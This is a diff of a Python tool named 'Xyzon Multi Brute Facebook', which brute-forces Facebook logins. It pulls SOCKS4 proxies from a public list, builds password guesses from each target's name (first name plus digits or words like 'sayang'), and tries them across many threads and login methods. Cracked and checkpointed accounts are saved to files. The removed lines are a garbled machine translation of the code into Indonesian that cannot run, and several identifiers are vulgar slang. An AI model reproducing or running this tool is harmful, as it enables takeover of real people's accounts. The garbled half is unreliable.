@@ -1,55 +1,78 @@
-#-----------------[MODUL IMPOR]-------------------#
-permintaan impor, bs4, json, os, sys, acak, datetime, waktu, kembali, urllib3, kaya, base64
-dari waktu mengimpor tidur
-dari import kaya cantik
-dari rich.tree mengimpor Pohon
-dari panel impor rich.panel
-dari cetak impor kaya seperti cetak
+#------------------[ IMPORT MODULE ]-------------------#
+import requests,bs4,json,os,sys,random,datetime,time,re,urllib3,rich,base64
+from time import sleep
+from rich import pretty
+from rich.tree import Tree
+from rich.panel import Panel
+from rich import print as cetak
 from rich import print as rprint
-dari cetak impor kaya sebagai cetakan
-dari trek impor rich.progress
-dari rich.text impor Teks sebagai tekz
-dari konsol impor rich.console
-dari rich.columns mengimpor Kolom
-dari rich.panel impor Panel sebagai nel
-dari rich.panel impor Panel sebagai panel
-dari bs4 impor BeautifulSoup sebagai sop
-from bs4 impor BeautifulSoup sebagai par
-dari rich.console import Group sebagai gp
-from bs4 impor BeautifulSoup sebagai parser
-dari rich.columns mengimpor Kolom sebagai kolom
-dari rich.console impor Konsol sebagai sol
-dari rich.markdown impor Penurunan harga sebagai mark
-from concurrent.futures mengimpor ThreadPoolExecutor sebagai tred
-dari concurrent.futures mengimpor ThreadPoolExecutor sebagai BrayennnXD
-dari rich.progress mengimpor Progress,SpinnerColumn,BarColumn,TextColumn
-#-----------------[MODUL]-------------------#
-mencoba:
-        impor kaya
-kecuali ImportError:
-        cetak(nel('\t• Sedang Menginstall Modul Kaya •'))
-        os.system('pip instal kaya')
-mencoba:
-        impor stdiomask
-kecuali ImportError:
+from rich import print as prints
+from rich.progress import track
+from rich.text import Text as tekz
+from rich.console import Console
+from rich.columns import Columns
+from rich.panel import Panel as nel
+from rich.panel import Panel as panel
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup as par
+from rich.console import Group as gp
+from bs4 import BeautifulSoup as parser
+from rich.columns import Columns as col
+from rich.console import Console as sol
+from rich.markdown import Markdown as mark
+from concurrent.futures import ThreadPoolExecutor as tred
+from concurrent.futures import ThreadPoolExecutor as BrayennnXD 
+from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
+#------------------[  MODULE  ]-------------------#
+try:
+        import rich
+except ImportError:
+        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
+        os.system('pip install rich')
+try:
+        import stdiomask
+except ImportError:
         cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
         os.system('pip install stdiomask')
-mencoba:
-	permintaan impor
-kecuali ImportError:
-	cetak(nel('\t• Permintaan Modul Sedang Menginstall •'))
-	os.system('pip install request && pip install mechanize')
-#-----------------[ NAMA GLOBAL ]-------------------#
-cantik.install()
+try:
+	import requests
+except ImportError:
+	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
+	os.system('pip install requests && pip install mechanize ')
+#------------------[ GLOBAL NAME ]-------------------#
+pretty.install()
 CON=sol()
-wa = Konsol()
-aplikasi=[]
+wa = Console()
+taplikasi=[]
 gabriel=[]
-konsol = konsol()
-ses=permintaan.Sesi()
-id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni,method,pwpluss,pwnya= [],[],0,0,0,[],[],[],[ ],[],[],[],[],[]
-ugen2,ugen,dia,cokbrut,dump,memek,ualu,ualuh,lisensikuni,lisensiku,princp=[],[],[],[],[],[],[],[],[],[ ],[]
-sys.stdout.write('\x1b]2; BMBF | BrayennnXD Multi Brute Facebook\x07')
+console = Console()
+ses=requests.Session()
+id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni,method,pwpluss,pwnya= [],[],0,0,0,[],[],[],[],[],[],[],[],[]
+ugen2,ugen,dia,cokbrut,dump,memek,ualu,ualuh,lisensikuni,lisensiku,princp=[],[],[],[],[],[],[],[],[],[],[]
+sys.stdout.write('\x1b]2; XMBF | Xyzon Multi Brute Facebook\x07')
+#------------------[ USER-AGENT ]-------------------#
+uman,usman1=[],[]
+pretty.install()
+CON=sol()
+ugen2=[]
+ugen=[]
+cokbrut=[]
+ses=requests.Session()
+princp=[]
+printcp=[]
+oks=[]
+cps=[]
+redmi=[]
+ugent=[]
+from rich.console import Console
+from rich.columns import Columns
+wa = Console()
+try:
+	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
+	open('.prox.txt','w').write(prox)
+except Exception as e:
+	print('[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mXyzonXD')
+prox=open('.prox.txt','r').read().splitlines()
 #------------------[ AGEN PENGGUNA ]-------------------#
 mencoba:
 	prox= request.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
@@ -93,28 +116,28 @@ def uaku():
 		untuk un di aa:
 			ua.tulis(hapus+'\n')
 		ua=buka('.bbnew.txt','r').baca().splitlines()
-#-----------[INDIKASI]---------------#
+#------------[ INDICATION ]---------------#
 P = '\x1b[1;97m' # PUTIH
-M = '\x1b[1;91m' #MERAH
+M = '\x1b[1;91m' # MERAH
 H = '\x1b[1;92m' # HIJAU
-K = '\x1b[1;93m' #KUNING
+K = '\x1b[1;93m' # KUNING
 B = '\x1b[1;94m' # BIRU
 U = '\x1b[1;95m' # UNGU
 O = '\x1b[1;96m' # BIRU MUDA
-N = '\x1b[0m' # WARNA MATI
-#-----------[WARNA-WARNA]--------------#
+N = '\x1b[0m'	# WARNA MATI
+#------------[ WARNA-COLOR ]--------------#
 P = '\x1b[1;97m'
 M = '\x1b[1;91m'
 H = '\x1b[1;92m'
 K = '\x1b[1;93m'
 B = '\x1b[1;94m'
-U = '\x1b[1;95m'
+U = '\x1b[1;95m' 
 O = '\x1b[1;96m'
 N = '\x1b[0m'    
 Z = "\033[1;30m"
-pak = '\033[41m\x1b[1;97m'
+sir = '\033[41m\x1b[1;97m'
 x = '\33[m' # DEFAULT
-m = '\x1b[1;91m' #MERAH +
+m = '\x1b[1;91m' #RED +
 k = '\033[93m' # KUNING +
 h = '\x1b[1;92m' # HIJAU +
 hh = '\033[32m' # HIJAU -
@@ -122,22 +145,22 @@ u = '\033[95m' # UNGU
 kk = '\033[33m' # KUNING -
 b = '\33[1;96m' # BIRU -
 p = '\x1b[0;34m' # BIRU +
-asu = random.pilihan([m,k,h,u,b])
-#-----------------------[ CONVERTER-BULAN ]--------------#
-dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni' ,'7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
-dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni' ,'07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Devember'}
+asu = random.choice([m,k,h,u,b])
+#--------------------[ CONVERTER-BULAN ]--------------#
+dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
+dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
 tgl = datetime.datetime.now().day
 bln = dic[(str(datetime.datetime.now().month))]
 thn = datetime.datetime.now().year
 okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
-bpk = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
-#-----------------[DUKUNGAN MESIN]---------------#
+cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+#------------------[ MACHINE-SUPPORT ]---------------#
 def alvino_xy(u):
-        untuk e di u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
-pasti jelas():
-	os.system('hapus')
-def kembali():
-	Gabung()
+        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
+def clear():
+	os.system('clear')
+def back():
+	login()
 #------------------[ LOGO-LAKNAT ]-----------------#
 def banner():
 	cetak(panel(f"""[bold green]                 _  _ _   _ ___  ____ _  _    _  _ ___  
@@ -1234,90 +1257,103 @@ def setting():
 	else:
 		ualuh.append('tidak')
 	passwrd()
-#------------------[ BAGIAN-WORDLIST ]------------#
-kata sandi def():
-	prog global, des
-	mencetak('')
+#-------------------[ BAGIAN-WORDLIST ]------------#
+def passwrd():
+	global prog,des
+	print('')
 	urut = []
 	urut.append(panel(f'        [bold green]%s [bold white]'%(okc),width=43,title=f"[bold green]OK SAVE IN",style=f"bold white"))
 	urut.append(panel(f'         [bold yellow]%s [bold white]'%(cpc),width=44,title=f"[bold yellow]CP SAVE IN",style=f"bold white"))
 	wa.print(Columns(urut))
 	cetak(panel(f'\t[bold cyan]On/Off Mode Pesawat Setiap 300 Idz Agar Terhindar Dari Spam Ip',width=90,title=f"[bold green]Informasi",subtitle=f"[bold green]Proses Crack",style=f"bold white"))
-	prog = Kemajuan(SpinnerColumn('jam'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
+	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
 	des = prog.add_task('',total=len(id2))
-	dengan program:
-		dengan tred(max_workers=30) sebagai kumpulan:
-			untuk yuzong di id2:
+	with prog:
+		with tred(max_workers=30) as pool:
+			for yuzong in id2:
 				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 				frs = nmf.split(' ')[0]
 				pwv = []
-				jika len(nmf)<6:
-					jika len(frs)<3:
-						lulus
-					kalau tidak:
-						pwv.tambahkan(nmf)
-						pwv.tambahkan(frs+'1')
-						pwv.tambahkan(frs+'01')
-						pwv.tambahkan(frs+'02')
-						pwv.tambahkan(frs+'03')
-						pwv.tambahkan(frs+'04')
-						pwv.tambahkan(frs+'05')
-						pwv.tambahkan(frs+'06')
-						pwv.tambahkan(frs+'07')
-						pwv.tambahkan(frs+'08')
-						pwv.tambahkan(frs+'09')
-						pwv.tambahkan(frs+'12')
-						pwv.tambahkan(frs+'321')
-						pwv.append(frs+'4321')
-				kalau tidak:
-					jika len(frs)<3:
-						pwv.tambahkan(nmf)
-					kalau tidak:
-						pwv.tambahkan(nmf)
-						pwv.tambahkan(frs+'1')
-						pwv.tambahkan(frs+'01')
-						pwv.tambahkan(frs+'02')
-						pwv.tambahkan(frs+'03')
-						pwv.tambahkan(frs+'04')
-						pwv.tambahkan(frs+'05')
-						pwv.tambahkan(frs+'06')
-						pwv.tambahkan(frs+'07')
-						pwv.tambahkan(frs+'08')
-						pwv.tambahkan(frs+'09')
-						pwv.tambahkan(frs+'12')
-						pwv.tambahkan(frs+'12')
-						pwv.tambahkan(frs+'321')
-						pwv.tambahkan(frs+'123')
+				if len(nmf)<6:
+					if len(frs)<3:
+						pass
+					else:
+						pwv.append(nmf)
+						pwv.append(frs+'01')
+						pwv.append(frs+'02')
+						pwv.append(frs+'03')
+						pwv.append(frs+'04')
+						pwv.append(frs+'05')
+						pwv.append(frs+'06')
+						pwv.append(frs+'07')
+						pwv.append(frs+'08')
+						pwv.append(frs+'09')
+						pwv.append(frs+'12')
+						pwv.append(frs+'123')
+						#pwv.append(frs+'321')
+						#pwv.append(frs+'4321')
+						#pwv.append(frs+'54321')
 						pwv.append(frs+'1234')
 						pwv.append(frs+'12345')
 						pwv.append(frs+'123456')
-				jika 'ya' di pwpluss:
-					untuk xpwd di pwnya:
-						pwv.tambahkan(xpwd)
-				lain: lulus
-				jika 'validasi1' dalam metode:
-					pool.kirim(validasi1,idf,pwv)
-				elif 'validasi2' dalam metode:
-					pool.kirim(validasi2,idf,pwv)
-				elif 'validate3' dalam metode:
-					pool.kirim(validasi3,idf,pwv)
-				elif 'reguler1' dalam metode:
-					pool.kirim(reguler1,idf,pwv)
-				elif 'reguler2' dalam metode:
-					pool.kirim(reguler2,idf,pwv)
-				elif 'reguler3' dalam metode:
-					pool.kirim(reguler3,idf,pwv)
-				elif 'bapi' dalam metode:
-					pool.kirim(bapi,idf,pwv)
-				elif 'kontol' dalam metode:
-					pool.kirim(kontol,idf,pwv)
-				elif 'colmek1' dalam metode:
-					pool.kirim(colmek1,idf,pwv)
-				elif 'colmek2' dalam metode:
-					pool.kirim(colmek2,idf,pwv)
-				kalau tidak:
-					pool.kirim(validasi1,idf,pwv)
-		mencetak('')
+						pwv.append(frs+'sayang')
+						pwv.append(frs+'cantik')
+						pwv.append('memek')
+						pwv.append('sayang')
+				else:
+					if len(frs)<3:
+						pwv.append(nmf)
+					else:
+						pwv.append(nmf)
+						pwv.append(frs+'1')
+						pwv.append(frs+'01')
+						pwv.append(frs+'02')
+						pwv.append(frs+'03')
+						pwv.append(frs+'04')
+						pwv.append(frs+'05')
+						pwv.append(frs+'06')
+						pwv.append(frs+'07')
+						pwv.append(frs+'08')
+						pwv.append(frs+'09')
+						pwv.append(frs+'12')
+						pwv.append(frs+'123')
+						pwv.append(frs+'321')
+						pwv.append(frs+'4321')
+						pwv.append(frs+'54321')
+						pwv.append(frs+'1234')
+						pwv.append(frs+'12345')
+						pwv.append(frs+'123456')
+						pwv.append(frs+'sayang')
+						pwv.append(frs+'cantik')
+						pwv.append('memek')
+						pwv.append('sayang')
+				if 'ya' in pwpluss: 
+					for xpwd in pwnya:
+						pwv.append(xpwd)
+				else:pass
+				if 'validate1' in method:
+					pool.submit(validate1,idf,pwv)
+				elif 'validate2' in method:
+					pool.submit(validate2,idf,pwv)
+				elif 'validate3' in method:
+					pool.submit(validate3,idf,pwv)
+				elif 'reguler1' in method:
+					pool.submit(reguler1,idf,pwv)
+				elif 'reguler2' in method:
+					pool.submit(reguler2,idf,pwv)
+				elif 'reguler3' in method:
+					pool.submit(reguler3,idf,pwv)
+				elif 'bapi' in method:
+					pool.submit(bapi,idf,pwv)
+				elif 'kontol' in method:
+					pool.submit(kontol,idf,pwv)
+				elif 'colmek1' in method:
+					pool.submit(colmek1,idf,pwv)
+				elif 'colmek2' in method:
+					pool.submit(colmek2,idf,pwv)
+				else:
+					pool.submit(validate1,idf,pwv)
+		print('')
 	print(f'\33[1;96m  Crack Telah Selesai,Semoga Anda Bersyukur Dengan Hasil Nya')
 	print(f'{x}  [{h}•{x}]{h} OK : {h}%s '%(ok))
 	print(f'{x}  [{h}•{x}]{k} CP : {k}%s{x} '%(cp))
